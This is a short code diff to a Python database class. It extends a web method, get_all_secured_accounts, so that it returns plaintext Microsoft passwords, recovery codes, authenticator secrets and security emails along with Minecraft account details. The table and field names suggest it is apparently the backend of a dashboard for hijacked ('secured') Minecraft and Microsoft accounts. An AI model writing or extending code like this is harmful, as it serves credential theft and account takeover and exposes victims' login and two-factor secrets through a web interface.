@@ -208,12 +208,16 @@ class DBConnection:
     # Web Methods
     def get_all_secured_accounts(self) -> list:
         rows = self.cursor.execute("""
-            SELECT account_id, ms_email, mc_name, mc_method, mc_gamertag, mc_capes, secured_at
+            SELECT account_id, ms_email, ms_security_email, ms_password, ms_recovery_code, ms_auth_secret,
+                   mc_name, mc_method, mc_gamertag, mc_capes, secured_at
             FROM secured_accounts
             ORDER BY secured_at DESC
             LIMIT 100
         """).fetchall()
-        keys = ["account_id", "ms_email", "mc_name", "mc_method", "mc_gamertag", "mc_capes", "secured_at"]
+        keys = [
+            "account_id", "ms_email", "ms_security_email", "ms_password", "ms_recovery_code", "ms_auth_secret",
+            "mc_name", "mc_method", "mc_gamertag", "mc_capes", "secured_at",
+        ]
         return [dict(zip(keys, row)) for row in rows]
 
     def get_stats(self) -> dict:
